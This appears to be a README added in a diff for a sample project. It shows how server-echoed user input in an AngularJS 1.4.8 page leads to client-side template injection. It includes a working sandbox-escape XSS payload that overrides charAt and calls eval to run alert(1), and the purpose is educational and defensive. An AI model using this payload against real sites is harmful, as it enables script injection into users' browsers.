@@ -1,0 +1,130 @@
+= Introduction
+
+https://angularjs.org/[AngularJS] is a popular JavaScript framework that allows embedding https://code.angularjs.org/1.4.9/docs/guide/expression[expressions] within double curly braces. https://code.angularjs.org/1.4.9/docs/guide/expression#example[For example], the expression `1+2={{1+2}}` will render as `1+2=3`.
+
+This means that if the server echos out user input that contains double curly braces, the user can perform a XSS exploit using  Angular expressions.
+
+= Writing User Input Server Side
+
+Let's explore a page that is safely HTML encoding user input. In our example below, we use http://www.thymeleaf.org/[Thymeleaf] to HTML encode and then output the attribute `username` to the text of the div of our page.
+
+[source,html]
+----
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+<title>AngularJS - Escaping the Expression Sandbox</title>
+</head>
+<body>
+<div th:text="${username}"></div>
+</body>
+</html>
+----
+
+If username is `<script>alert('Rob')</script>` the output might look like:
+
+[source,html]
+----
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+<title>AngularJS - Escaping the Expression Sandbox</title>
+</head>
+<body>
+<div>&lt;script&gt;alert(&#39;Rob&#39;)&lt;/script&gt;</div>
+</body>
+</html>
+----
+
+You will notice that the output is properly HTML encoded. This means our application is currently safe from XSS attacks.
+
+= Adding AngularJS
+
+Our application is currently secure against XSS attacks. Let's update the application to use AngularJS
+
+[source,html]
+----
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+<title>Angular Expression - safe</title>
+<script src="angular-1.4.8.min.js"></script>
+</head>
+<body ng-app>
+<div th:text="${username}"></div>
+</body>
+</html>
+----
+
+You will notice two changes:
+
+* We include added `angular-1.4.8.min.js`
+* We added `ng-app` to the body element
+
+Our application is now vulnerable to XSS attacks, but how can we exploit it? The big clue should be our introduction to Angular expressions. What would happen with a username of ``1+2={{1+2}}``? The result would be:
+
+[source,html]
+----
+<html>
+<head>
+<title>Angular Expression - safe</title>
+<script src="angular-1.4.8.min.js"></script>
+</head>
+<body ng-app="">
+<div>1+2={{1+2}}</div>
+</body>
+</html>
+----
+
+Angular would then update the DOM to be:
+
+[source,html]
+----
+<html>
+<head>
+<title>Angular Expression - safe</title>
+<script src="angular-1.4.8.min.js"></script>
+</head>
+<body ng-app="">
+<div>1+2=3</div>
+</body>
+</html>
+----
+
+We could try a username of `{{alert('Rob')}}`, but that would be blocked by https://code.angularjs.org/1.4.9/docs/guide/security#expression-sandboxing[Expression Sandboxing]. At this point you might think that we are safe. However, despite appearing in the security section of the documention, Expression Sandboxing is not intended to provide security.
+
+More concretely, the documentation states the following about https://code.angularjs.org/1.4.9/docs/guide/security#mixing-client-side-and-server-side-templates[Mixing client-side and server-side templates]:
+
+> In general, we recommend against this because it can create unintended XSS vectors.
+
+Ultimately, this means that if you allow user input to be rendered in templates on the server side, the application is vulnerable to XSS attacks. Let's take a look at a concrete example.
+
+= Escaping the Expression Sandbox
+
+If our payload is sandboxed, how can we provide a valid XSS exploit?
+What would happen if our username was:
+
+[source,javascript]
+----
+{{
+'a'.constructor.prototype.charAt=[].join;
+eval('x=1} } };alert(1)//');
+}}
+----
+
+By overriding the native function `charAt` we can bypass Angular's Expression Sandbox and allow us to execute `alert(1)`. Refer to http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html[XSS without HTML: Client-Side Template Injection with AngularJS] for complete details of how the exploit works.
+
+NOTE: This only works in Chrome.
+
+= Conclusion
+
+Allowing the server to echo user input into an Angular template will expose your application to XSS exploits. More generally, you should not mix server side rendering of user input and client side templates. You can find a sample that accompanies this blog post at  https://github.com/rwinch/angularjs-escaping-expression-sandbox[rwinch/angularjs-escaping-expression-sandbox].
+
+= Running the Sample
+
+You can import the project as a Maven project and run `sample.Application` as a main method.
+Alternatively, you can invoke:
+
+[source,bash]
+----
+$ ./mvnw spring-boot:run
+----
+
+The application will be avilable at http://localhost:8080
